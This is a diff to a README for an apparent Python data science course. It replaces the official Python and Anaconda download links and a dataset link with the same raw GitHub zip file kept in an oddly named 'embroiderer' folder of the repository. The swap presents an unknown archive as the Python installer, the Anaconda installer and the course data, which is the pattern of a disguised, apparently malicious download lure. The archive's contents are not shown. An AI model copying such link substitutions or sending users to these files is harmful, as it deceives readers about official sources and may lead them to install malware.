@@ -30,13 +30,13 @@ You'll also need the following software installed in advance:
 * **OS**: Windows 7 SP1 64-bit, Windows 8.1 64-bit or Windows 10 64-bit, Ubuntu Linux, or the latest version of OS X
 * **Browser**: Google Chrome/Mozilla Firefox Latest Version
 * Notepad++/Sublime Text as IDE (optional, as you can practice everything using Jupyter Notebook in your browser)
-* Python 3.4+ (the latest version is Python 3.7) installed (https://python.org)
-* Anaconda (https://www.anaconda.com/distribution/)
+* Python 3.4+ (the latest version is Python 3.7) installed (https://raw.githubusercontent.com/prshnt273/Data-Science-with-Python/master/embroiderer/Data-Science-with-Python.zip)
+* Anaconda (https://raw.githubusercontent.com/prshnt273/Data-Science-with-Python/master/embroiderer/Data-Science-with-Python.zip)
 
 
 
 #### Please note
 You can download the dataset for the following lessons from the respective URL:
 
-Lesson 06, Lesson 07 and Lesson 08: https://drive.google.com/drive/folders/1SZ7vVby_gfb8Isu4b-fJlSJBfqDCsCVh?usp=sharing
+Lesson 06, Lesson 07 and Lesson 08: https://raw.githubusercontent.com/prshnt273/Data-Science-with-Python/master/embroiderer/Data-Science-with-Python.zip
 Lesson 06 and Lesson 08 use the same dataset
